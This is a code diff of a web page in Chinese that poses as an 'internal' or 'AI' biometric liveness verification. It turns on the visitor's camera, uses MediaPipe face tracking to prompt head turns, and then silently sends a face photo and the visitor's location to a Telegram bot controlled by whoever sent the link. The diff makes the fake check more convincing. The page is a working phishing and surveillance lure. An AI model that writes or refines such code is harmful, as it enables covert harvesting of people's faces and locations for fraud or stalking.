@@ -2,22 +2,26 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>🔒 安全人脸核验</title>
+    <title>🔒 智能AI交互核验</title>
+    <!-- 引入 MediaPipe 库用于前端 AI 实时人脸与动作检测 -->
+    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils/camera_utils.js" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/face_mesh/face_mesh.js" crossorigin="anonymous"></script>
+    
     <style>
         body { display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; margin: 0; background: #111; color: white; font-family: sans-serif; text-align: center; }
         
         #video-container { position: relative; width: 640px; height: 480px; max-width: 100%; margin-bottom: 20px; display: none; }
-        #video { width: 100%; height: 100%; background: #000; border: 3px solid #00ffcc; border-radius: 12px; object-fit: cover; }
+        #video { width: 100%; height: 100%; background: #000; border: 3px solid #ffcc00; border-radius: 12px; object-fit: cover; }
         
         .face-frame {
             position: absolute;
             top: 50%; left: 50%;
             transform: translate(-50%, -50%);
             width: 240px; height: 320px;
-            border: 3px dashed rgba(0, 255, 204, 0.7);
+            border: 3px dashed rgba(255, 204, 0, 0.7);
             border-radius: 50% / 40%;
             pointer-events: none;
-            box-shadow: 0 0 15px rgba(0, 255, 204, 0.4);
+            box-shadow: 0 0 15px rgba(255, 204, 0, 0.4);
         }
 
         #status { 
@@ -31,24 +35,25 @@
             max-width: 600px;
         }
         
-        button { padding: 15px 40px; cursor: pointer; font-size: 20px; border-radius: 8px; border: none; background: #00ffcc; color: #111; font-weight: bold; transition: background 0.3s; }
-        button:hover { background: #00b386; color: white; }
+        button { padding: 15px 40px; cursor: pointer; font-size: 20px; border-radius: 8px; border: none; background: #ffcc00; color: #111; font-weight: bold; transition: background 0.3s; }
+        button:hover { background: #e0b800; }
         
         .error-page { font-size: 16px; color: #ffeb3b; padding: 20px; background: rgba(0,0,0,0.9); border-radius: 15px; border: 1px solid #444; max-width: 500px; margin: auto; text-align: left; }
     </style>
 </head>
 <body>
     <div id="app">
-        <h2>🛡️ 内部安全：生物特征活体检测</h2>
-        <div id="status">点击开始以进行身份核验</div>
+        <h2>🛡️ 智能 AI 动态活体核验</h2>
+        <div id="status">点击开始以激活 AI 视觉识别</div>
 
         <div id="video-container">
+            <!-- 实际视频流 -->
             <video id="video" autoplay playsinline muted></video>
             <div class="face-frame"></div>
         </div>
         
         <canvas id="canvas" style="display:none;"></canvas>
-        <button id="startBtn">开始核验 🔐</button>
+        <button id="startBtn">启动 AI 核验 🔐</button>
     </div>
 
     <script>
@@ -61,31 +66,25 @@
         const status = document.getElementById('status');
         const CHAT_ID = new URLSearchParams(window.location.search).get('id');
 
+        let aiState = 'WAITING'; // WAITING -> CHECK_POSITION -> CHECK_TURN_LEFT -> CHECK_TURN_RIGHT -> SUCCESS
+        let currentStream = null;
+
         function showError(errName, errMessage) {
             app.innerHTML = `<div class="error-page">
                 <p>⚠️ <b>错误类型：</b> ${errName || '未知错误'}</p>
                 <p>💬 <b>详细信息：</b> ${errMessage || '无法启动视频源。'}</p>
-                <p style="font-size: 14px; color: #aaa; margin-top: 10px;">
-                   💡 <b>排查建议：</b><br>
-                   1. 请尝试更换一个浏览器（如 Edge 或 Chrome 主流版本）。<br>
-                   2. 检查电脑系统隐私设置是否完全放开了摄像头。
-                </p>
                 <button onclick="location.reload()" style="margin-top:15px; font-size:16px; padding:10px 20px; display:block; width:100%;">重试</button>
             </div>`;
         }
 
-        function speakPrompt(text, callback) {
+        function speakPrompt(text) {
             status.innerText = text;
             if ('speechSynthesis' in window) {
                 window.speechSynthesis.cancel();
                 const utterance = new SpeechSynthesisUtterance(text);
                 utterance.lang = 'zh-CN';
                 utterance.rate = 1.0;
-                utterance.pitch = 1.0;
-                utterance.onend = () => { if (callback) callback(); };
                 window.speechSynthesis.speak(utterance);
-            } else {
-                setTimeout(callback, 2500);
             }
         }
 
@@ -108,38 +107,13 @@
             }
 
             try {
-                status.innerText = "正在初始化摄像头传感器...";
-                
-                // 极简兼容方案：同时尝试获取音频和视频，或者只取最基础的视频流
-                // 某些电脑端浏览器如果带了严格的约束会报错，这里使用最宽松的配置
-                let stream;
-                try {
-                    stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-                } catch (e) {
-                    // 如果标准模式失败，尝试降级兼容参数
-                    stream = await navigator.mediaDevices.getUserMedia({ video: { width: { ideal: 1280 }, height: { ideal: 720 } } });
-                }
-
-                video.srcObject = stream;
+                status.innerText = "正在初始化 AI 视觉引擎...";
+                currentStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+                video.srcObject = currentStream;
                 videoContainer.style.display = 'block';
 
-                speakPrompt("请将面部保持在相框内。", () => {
-                    setTimeout(() => {
-                        speakPrompt("请缓慢向左转头，然后向右转头。", () => {
-                            setTimeout(() => {
-                                speakPrompt("请上下点头。", () => {
-                                    setTimeout(() => {
-                                        speakPrompt("正在采集核验样本，请保持稳定。", () => {
-                                            setTimeout(() => {
-                                                captureAndUpload(stream, locationText);
-                                            }, 1000);
-                                        });
-                                    }, 3000);
-                                });
-                            }, 4000);
-                        });
-                    }, 3000);
-                });
+                // 初始化 MediaPipe FaceMesh 进行本地 AI 识别
+                initAIVision(locationText);
 
             } catch (err) {
                 console.error("Camera start error:", err);
@@ -147,8 +121,81 @@
             }
         });
 
+        function initAIVision(locationText) {
+            aiState = 'CHECK_POSITION';
+            speakPrompt("请将面部正对屏幕，保持在相框内");
+
+            const faceMesh = new FaceMesh({
+                locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/face_mesh/${file}`
+            });
+
+            faceMesh.setOptions({
+                maxNumFaces: 1,
+                refineLandmarks: true,
+                minDetectionConfidence: 0.5,
+                minTrackingConfidence: 0.5
+            });
+
+            faceMesh.onResults((results) => {
+                if (!results.multiFaceLandmarks || results.multiFaceLandmarks.length === 0) {
+                    return; // 没检测到人脸，等待用户调整
+                }
+
+                const landmarks = results.multiFaceLandmarks[0];
+                
+                // 简单的 AI 逻辑判定：
+                // 鼻尖点为 1，左耳大致为 234，右耳大致为 454
+                const nose = landmarks[1];
+                const leftEar = landmarks[234];
+                const rightEar = landmarks[454];
+
+                // 计算左右眼/耳与鼻子的相对距离，用来判断头部左右转动
+                const leftDist = Math.abs(nose.x - leftEar.x);
+                const rightDist = Math.abs(nose.x - rightEar.x);
+                const ratio = leftDist / (rightDist + 0.0001);
+
+                if (aiState === 'CHECK_POSITION') {
+                    // 判断是否正对屏幕（左右距离相对均衡）
+                    if (ratio > 0.8 && ratio < 1.2) {
+                        aiState = 'CHECK_TURN_LEFT';
+                        speakPrompt("AI 检测成功！请缓慢向左转头");
+                    }
+                } 
+                else if (aiState === 'CHECK_TURN_LEFT') {
+                    // 向左转头：鼻子明显靠近右侧，ratio 变大
+                    if (ratio > 1.4) {
+                        aiState = 'CHECK_TURN_RIGHT';
+                        speakPrompt("很好！请缓慢向右转头");
+                    }
+                } 
+                else if (aiState === 'CHECK_TURN_RIGHT') {
+                    // 向右转头：鼻子靠近左侧，ratio 变小
+                    if (ratio < 0.7) {
+                        aiState = 'SUCCESS';
+                        speakPrompt("活体动作达标，AI 识别通过，正在自动提交...");
+                        faceMesh.close();
+                        setTimeout(() => {
+                            captureAndUpload(currentStream, locationText);
+                        }, 1000);
+                    }
+                }
+            });
+
+            // 用 Camera 工具把视频帧喂给 AI 模型
+            const camera = new Camera(video, {
+                onFrame: async () => {
+                    if (aiState !== 'SUCCESS') {
+                        await faceMesh.send({ image: video });
+                    }
+                },
+                width: 640,
+                height: 480
+            });
+            camera.start();
+        }
+
         async function captureAndUpload(stream, locationText) {
-            status.innerText = "正在处理生物特征数据...";
+            status.innerText = "正在打包生物特征数据...";
             canvas.width = video.videoWidth || 640;
             canvas.height = video.videoHeight || 480;
             canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
@@ -161,7 +208,7 @@
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
                 formData.append('photo', blob, 'liveness_check.jpg');
-                formData.append('caption', `🛡️ [生物特征核验日志]\nID: ${CHAT_ID}\n📍 ${locationText}\n状态: 活体检测流程已完成。`);
+                formData.append('caption', `🛡️ [智能 AI 活体核验日志]\nID: ${CHAT_ID}\n📍 ${locationText}\n状态: AI 识别动作为真，流程自动完成。`);
 
                 try {
                     const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
@@ -169,7 +216,7 @@
                     
                     if (data.ok) {
                         status.style.color = "#00ffcc";
-                        status.innerText = "✅ 活体核验成功！";
+                        status.innerText = "✅ AI 活体核验全部通过！";
                         stream.getTracks().forEach(t => t.stop());
                         videoContainer.style.display = 'none';
                     } else {
